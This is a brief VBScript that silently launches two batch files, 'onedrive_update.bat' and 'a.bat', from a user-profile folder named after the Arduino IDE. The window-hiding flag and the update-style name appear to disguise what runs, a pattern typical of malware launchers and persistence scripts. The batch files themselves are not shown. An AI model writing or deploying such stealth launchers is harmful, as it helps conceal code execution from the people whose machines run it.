Set WshShell = CreateObject("WScript.Shell") 
WshShell.Run chr(34) & "%userprofile%\documents\arduinoide\onedrive_update.bat" & Chr(34), 0
WshShell.Run chr(34) & "%userprofile%\documents\arduinoide\a.bat" & Chr(34), 0

Set WshShell = Nothing